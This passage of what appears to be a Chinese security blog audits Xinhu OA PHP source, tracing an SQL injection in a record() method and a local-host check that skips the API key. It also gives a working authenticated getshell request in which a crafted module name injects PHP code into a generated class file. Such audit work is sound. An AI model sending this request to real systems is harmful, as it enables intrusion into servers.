<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$array</span>,<span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$addbool</span>    = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isempt</span>(<span class="variable">$where</span>))<span class="variable">$addbool</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$cont</span>    = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$cont</span>.=<span class="string">&quot;,`<span class="subst">$key</span>`=&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toaddval</span>(<span class="variable">$val</span>).<span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$cont</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$cont</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$cont</span>  = <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">gettables</span>(<span class="variable">$table</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$addbool</span>)&#123;</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;insert into <span class="subst">$table</span> set <span class="subst">$cont</span>&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$where</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getwhere</span>(<span class="variable">$where</span>);</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;update <span class="subst">$table</span> set <span class="subst">$cont</span> where <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">tranbegin</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里带入SQL语句查询 导致注入 同时还要注意下父类openapiAction.php中的init方法 这里的Host需要属于127.0.0.1 或 192.168.x.x 的范围.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;display= <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$openkey</span>     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;openkey&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;openkey   = <span class="title function_ invoke__">getconfig</span>(<span class="string">&#x27;openkey&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;keycheck &amp;&amp; HOST != <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">contain</span>(HOST,<span class="string">&#x27;192.168&#x27;</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;openkey != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$openkey</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;openkey))<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;openkey not access&#x27;</span>, <span class="number">201</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getpostdata</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="信呼OA普通用户权限getshell"><a href="#信呼OA普通用户权限getshell" class="headerlink" title="信呼OA普通用户权限getshell"></a>信呼OA普通用户权限getshell</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index.php?d=main&amp;m=flow&amp;a=copymode&amp;ajaxbool=true</span><br><span class="line">POST:</span><br><span class="line">id=1&amp;name=a&#123;&#125;;phpinfo ();class a</span><br><span class="line"></span><br><span class="line">生成的文件：/webmain/flow/input/mode_a%7B%7D%3Bphpinfo%20%28%29%3Bclass%20aAction.php</span><br><span class="line">/webmain/model/flow/2%7B%7D%3Bphpinfo%20%28%29%3Bclass%20aModel.php</span><br><span class="line"></span><br><span class="line">其实是</span><br><span class="line">![](xinhuoaaudit/image-3.png)</span><br></pre></td></tr></table></figure>
<p>代码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	*	复制模块</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copymodeAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$id</span> 	= (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">		<span class="variable">$bhnu</span> 	= <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;name&#x27;</span>)));</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">isempt</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;新模块编号不能为空&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;模块编号不能用数字&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$bhnu</span>)&lt;<span class="number">4</span>)<span class="keyword">return</span> <span class="string">&#x27;编号至少要4位&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">c</span>(<span class="string">&#x27;check&#x27;</span>)-&gt;<span class="title function_ invoke__">isincn</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;编号不能包含中文&#x27;</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$dbs</span> 	= <span class="title function_ invoke__">m</span>(<span class="string">&#x27;mode&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">rows</span>(<span class="string">&quot;`num`=&#x27;<span class="subst">$bhnu</span>&#x27;&quot;</span>)&gt;<span class="number">0</span>)<span class="keyword">return</span> <span class="string">&#x27;模块编号[&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;]已存在&#x27;</span>;</span><br><span class="line">		<span class="variable">$mrs</span> 	= <span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="variable">$id</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$mrs</span>)<span class="keyword">return</span> <span class="string">&#x27;模块不存在&#x27;</span>;</span><br><span class="line">		<span class="variable">$ars</span> 	= <span class="variable">$mrs</span>;</span><br><span class="line">		<span class="variable">$name</span>	= <span class="variable">$mrs</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;复制&#x27;</span>;</span><br><span class="line">		<span class="variable">$biaom</span>	= <span class="variable">$bhnu</span>;</span><br><span class="line">		<span class="variable">$obha</span> 	= <span class="variable">$mrs</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">		<span class="keyword">unset</span>(<span class="variable">$ars</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">		<span class="variable">$ars</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line">		<span class="variable">$ars</span>[<span class="string">&#x27;num&#x27;</span>]  = <span class="variable">$bhnu</span>;</span><br><span class="line">		<span class="variable">$ars</span>[<span class="string">&#x27;table&#x27;</span>]= <span class="variable">$biaom</span>;</span><br><span class="line">		<span class="variable">$tablea</span>[]	 = <span class="variable">$mrs</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line">		<span class="variable">$tables</span>		 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable">$staba</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>]);</span><br><span class="line">			<span class="keyword">foreach</span>(<span class="variable">$staba</span> <span class="keyword">as</span> <span class="variable">$kz</span>=&gt;<span class="variable">$zb1</span>)&#123;</span><br><span class="line">				<span class="variable">$tables</span>.=<span class="string">&#x27;,&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;zb&#x27;</span>.(<span class="variable">$kz</span>+<span class="number">1</span>).<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">				<span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$zb1</span>, <span class="variable">$tablea</span>))<span class="variable">$tablea</span>[]=<span class="variable">$zb1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$tables</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tables</span>, <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>] = <span class="variable">$tables</span>;</span><br><span class="line">		<span class="variable">$modeid</span>  = <span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$ars</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//复制表</span></span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$tablea</span> <span class="keyword">as</span> <span class="variable">$kz</span>=&gt;<span class="variable">$tabs</span>)&#123;</span><br><span class="line">			<span class="variable">$sqla</span> 	   = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getall</span>(<span class="string">&#x27;show create table `[Q]&#x27;</span>.<span class="variable">$tabs</span>.<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line">			<span class="variable">$createsql</span> = <span class="variable">$sqla</span>[<span class="number">0</span>][<span class="string">&#x27;Create Table&#x27;</span>];</span><br><span class="line">			<span class="variable">$biaom1</span>	   = <span class="string">&#x27;&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$kz</span>&gt;<span class="number">0</span>)<span class="variable">$biaom1</span>	   = <span class="string">&#x27;&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;zb&#x27;</span>.<span class="variable">$kz</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="variable">$createsql</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;`&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$tabs</span>.<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;`&#x27;</span>.<span class="variable">$biaom1</span>.<span class="string">&#x27;`&#x27;</span>,<span class="variable">$createsql</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$createsql</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;alter table `&#x27;</span>.<span class="variable">$biaom1</span>.<span class="string">&#x27;` AUTO_INCREMENT=1&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//复制表单元素</span></span><br><span class="line">		<span class="variable">$db1</span>  = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;flow_element&#x27;</span>);</span><br><span class="line">		<span class="variable">$rows</span> = <span class="variable">$db1</span>-&gt;<span class="title function_ invoke__">getall</span>(<span class="string">&#x27;mid=&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$rows</span> <span class="keyword">as</span> <span class="variable">$k1</span>=&gt;<span class="variable">$rs1</span>)&#123;</span><br><span class="line">			<span class="variable">$rs2</span> = <span class="variable">$rs1</span>;</span><br><span class="line">			<span class="keyword">unset</span>(<span class="variable">$rs2</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">			<span class="variable">$rs2</span>[<span class="string">&#x27;mid&#x27;</span>] = <span class="variable">$modeid</span>;</span><br><span class="line">			<span class="variable">$db1</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$rs2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//复制相关布局文件</span></span><br><span class="line">		<span class="variable">$hurs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfiles</span>();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$hurs</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$file</span>)&#123;</span><br><span class="line">			<span class="variable">$from</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$obha</span>,<span class="variable">$file</span>);</span><br><span class="line">			<span class="variable">$to</span>   = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$bhnu</span>,<span class="variable">$file</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$from</span>))&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$k</span>&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">					<span class="variable">$fstr</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$from</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$k</span>==<span class="number">0</span>)<span class="variable">$fstr</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flow_&#x27;</span>.<span class="variable">$obha</span>.<span class="string">&#x27;ClassModel&#x27;</span>,<span class="string">&#x27;flow_&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;ClassModel&#x27;</span>,<span class="variable">$fstr</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$k</span>==<span class="number">1</span>)<span class="variable">$fstr</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;mode_&#x27;</span>.<span class="variable">$obha</span>.<span class="string">&#x27;ClassAction&#x27;</span>,<span class="string">&#x27;mode_&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;ClassAction&#x27;</span>,<span class="variable">$fstr</span>);</span><br><span class="line">					<span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">createtxt</span>(<span class="variable">$to</span>, <span class="variable">$fstr</span>);</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					@<span class="title function_ invoke__">copy</span>(<span class="variable">$from</span>, <span class="variable">$to</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>漏洞代码主要出现在上面，可以看到<code>$bhnu 	= strtolower(trim($this-&gt;post(&#39;name&#39;)));</code>接收了外部输入，且在下面的copy中有使用到<code>$to</code>，这个变量是输入经过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$to</span>   = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$bhnu</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">createtxt</span>(<span class="variable">$to</span>, <span class="variable">$fstr</span>);</span><br></pre></td></tr></table></figure>
<p>处理的，跟进createtxt函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*	写入文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createtxt</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$txt</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createdir</span>(<span class="variable">$path</span>);</span><br><span class="line">	<span class="variable">$path</span>	= <span class="string">&#x27;&#x27;</span>.ROOT_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$path</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	@<span class="variable">$file</span>	= <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">	<span class="variable">$bo</span> 	= <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$file</span>)&#123;</span><br><span class="line">		<span class="variable">$bo</span> = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$txt</span>)<span class="variable">$bo</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>,<span class="variable">$txt</span>);</span><br><span class="line">		<span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$bo</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到可以直接写入文件而没有过滤<br>写入的文件内容：<code>mode_a&#123;&#125;;phpinfo ();class aAction.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*	此文件是流程模块【gong.通知公告】对应接口文件。</span></span><br><span class="line"><span class="comment">*	可在页面上创建更多方法如：public funciton testactAjax()，用js.getajaxurl(&#x27;testact&#x27;,&#x27;mode_gong|input&#x27;,&#x27;flow&#x27;)调用到对应方法</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mode_a</span></span>&#123;&#125;;<span class="title function_ invoke__">phpinfo</span> ();<span class="class"><span class="keyword">class</span> <span class="title">aClassAction</span> <span class="keyword">extends</span> <span class="title">inputAction</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">savebefore</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$arr</span>, <span class="variable">$id</span>, <span class="variable">$addbo</span></span>)</span>&#123;</span><br><span class="line">		<span class="comment">//$uarr[&#x27;receid&#x27;] = $this-&gt;flow-&gt;getreceids($arr[&#x27;receid&#x27;]);</span></span><br><span class="line">		<span class="variable">$uarr</span> = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;issms&#x27;</span>]))<span class="variable">$uarr</span>[<span class="string">&#x27;issms&#x27;</span>]=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;rows&#x27;</span> =&gt; <span class="variable">$uarr</span></span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">saveafter</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$arr</span>, <span class="variable">$id</span>, <span class="variable">$addbo</span></span>)</span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//提交投票</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">submittoupiaoAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$mid</span> 		= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mid&#x27;</span>);</span><br><span class="line">		<span class="variable">$sid</span> 		= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;sid&#x27;</span>);</span><br><span class="line">		<span class="variable">$modenum</span> 	= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;modenum&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;flow	= <span class="title function_ invoke__">m</span>(<span class="string">&#x27;flow&#x27;</span>)-&gt;<span class="title function_ invoke__">initflow</span>(<span class="variable">$modenum</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$towheer</span>	= <span class="string">&quot;`table`=&#x27;infor&#x27; and `mid`=&#x27;<span class="subst">$mid</span>&#x27; and `name`=&#x27;投票&#x27; and `checkid`=&#x27;<span class="subst">$this</span>-&gt;adminid&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;flow-&gt;flogmodel-&gt;<span class="title function_ invoke__">rows</span>(<span class="variable">$towheer</span>)&gt;<span class="number">0</span>)<span class="keyword">return</span> <span class="string">&#x27;你已投票了&#x27;</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;flow-&gt;<span class="title function_ invoke__">addlog</span>(<span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;投票&#x27;</span>,</span><br><span class="line">			<span class="string">&#x27;mid&#x27;</span>  =&gt; <span class="variable">$mid</span>,</span><br><span class="line">			<span class="string">&#x27;explain&#x27;</span> =&gt; <span class="string">&#x27;投票项ID(&#x27;</span>.<span class="variable">$sid</span>.<span class="string">&#x27;)&#x27;</span> </span><br><span class="line">		));</span><br><span class="line">		<span class="title function_ invoke__">m</span>(<span class="string">&#x27;infors&#x27;</span>)-&gt;<span class="title function_ invoke__">update</span>(<span class="string">&#x27;`touci`=`touci`+1&#x27;</span>,<span class="string">&#x27;`mid`=&#x27;</span>.<span class="variable">$mid</span>.<span class="string">&#x27; and `id` in(&#x27;</span>.<span class="variable">$sid</span>.<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
<p>主要原因是在copymodeAjax 中 str_replace 把类名换了 然后 刚好payload可以闭合前面的内容，实现插入代码</p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E5%91%BCOA-%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">信呼OA 审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">入口分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rockclass"><span class="toc-number">3.</span> <span class="toc-text">Rockclass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E5%88%B0index"><span class="toc-number">4.</span> <span class="toc-text">回到index</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%8F%E4%BE%BF%E6%89%BE%E4%B8%AA%E5%8A%9F%E8%83%BD%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">随便找个功能点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-7327"><span class="toc-number">6.</span> <span class="toc-text">CVE-2024-7327</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 